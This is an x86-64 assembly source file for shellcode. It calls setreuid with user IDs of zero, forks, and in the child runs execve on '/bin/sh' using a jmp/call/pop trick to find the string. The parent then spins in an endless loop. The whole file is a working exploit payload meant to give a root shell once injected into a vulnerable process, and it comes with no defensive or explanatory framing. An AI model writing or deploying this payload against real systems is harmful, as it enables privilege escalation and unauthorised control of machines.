BITS 64
GLOBAL _start

SECTION .data                  ; needs to be writable and executable for testing
_start:
    ; setreuid(ruid, euid)
    xor rax, rax
    add rax, 113           ; 113 = setreuid
    xor rdi, rdi           ; real userid
    xor rsi, rsi           ; effective userid
    syscall


do_fork:
    mov rax, 57 ; 57 = fork
    syscall

    test eax, eax
    jnz done

    jmp get_address        ; get the address of our string

run:
    ; execve(char *filename, char *argv[], char *envp[])
    xor rax, rax
    add rax, 59            ; 59 = execve
    pop rdi                ; pop string address
    xor rsi, rsi           ; char *argv[] = null
    xor rdx, rdx           ; char *envp[] = null
    syscall


get_address:
    call run               ; push the address of the string onto the stack

shell:
    db '/bin/sh',0

done:
 jmp done

